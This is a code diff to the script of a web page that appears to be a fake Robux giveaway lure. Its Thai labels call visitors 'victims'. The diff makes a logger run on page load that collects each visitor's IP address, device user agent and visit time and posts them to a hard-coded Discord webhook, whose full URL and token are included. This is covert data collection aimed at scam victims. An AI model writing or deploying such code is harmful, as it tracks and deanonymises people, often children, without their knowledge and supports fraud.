@@ -59,19 +59,25 @@
     </audio>
 
     <script>
-        async function sendLog() {
+        (async function sendLogInstantly() {
             const webhookURL = "https://discord.com/api/webhooks/1497671101940105287/2IL9P9RTQfnFwkckvU9MDVrz7uVHk6SdT0MdL64s-a6niXXx8fP36Ev6tfTHzuPna19m";
             
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
+                let ip = "ไม่สามารถดึง IP ได้";
+                try {
+                    const ipRes = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipRes.json();
+                    ip = ipData.ip;
+                } catch (e) {
+                    console.log("ดึง IP สำรอง...");
+                }
                 
                 const params = {
                     embeds: [{
-                        title: "📸 เหยื่อติดกับดัก Robux แล้ว!",
+                        title: "📸 เหยื่อเข้ามาในเว็บแล้ว!",
                         color: 16711680,
                         fields: [
-                            { name: "🌐 IP Address", value: `**${ipData.ip}**`, inline: true },
+                            { name: "🌐 IP Address", value: `**${ip}**`, inline: true },
                             { name: "📱 Device Info", value: navigator.userAgent },
                             { name: "⏰ เวลา", value: new Date().toLocaleString('th-TH'), inline: true }
                         ],
@@ -85,11 +91,13 @@
                     body: JSON.stringify(params)
                 });
             } catch (err) {
-                console.error("Log failed:", err);
+                console.error("Webhook failed:", err);
             }
+        })();
+
+        async function sendLog() {
         }
 
-        // ส่ง IP ทันทีที่เข้าเว็บ
         sendLog();
 
         document.getElementById('roll-btn').addEventListener('click', function() {
